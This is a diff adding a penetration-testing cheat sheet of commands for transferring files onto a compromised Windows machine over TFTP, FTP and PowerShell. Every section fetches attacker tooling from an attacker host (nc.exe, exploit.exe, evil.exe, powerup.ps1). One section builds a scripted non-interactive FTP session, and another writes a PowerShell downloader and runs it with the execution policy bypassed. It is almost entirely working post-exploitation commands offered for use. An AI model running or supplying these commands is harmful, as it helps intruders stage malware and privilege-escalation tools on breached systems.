@@ -1,1 +1,44 @@
 
+--------------------------------------
+TFTP
+# Windows XP and Win 2003 contain tftp client. Windows 7 do not by default 
+# tfpt clients are usually non-interactive, so they could work through an obtained shell 
+
+atftpd --daemon --port 69 /tftp
+Windows> tftp -i 192.168.30.45 GET nc.exe
+
+--------------------------------------
+
+FTP (pyftpdlib client on Kali)
+# Ftp is generally installed on Windows machines
+# To make it interactive, use -s option
+
+# On Kali install a ftp client and set a username/password
+apt-get install python-pyftpdlib  
+python -m pyftpdlib -p 21
+
+# on Windows
+ftp <attackerip>
+> binary
+> get exploit.exe
+
+-------------------------------------------
+
+FTP (... client on Kali)
+# On Windows
+echo open <attackerip> 21> ftp.txt
+echo USER username password >> ftp.txt
+echo bin >> ftp.txt
+echo GET evil.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+
+--------------------------------------
+
+Powershell
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://<attackerip>/powerup.ps1" >>wget.ps1
+echo $file = "powerup.ps1" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
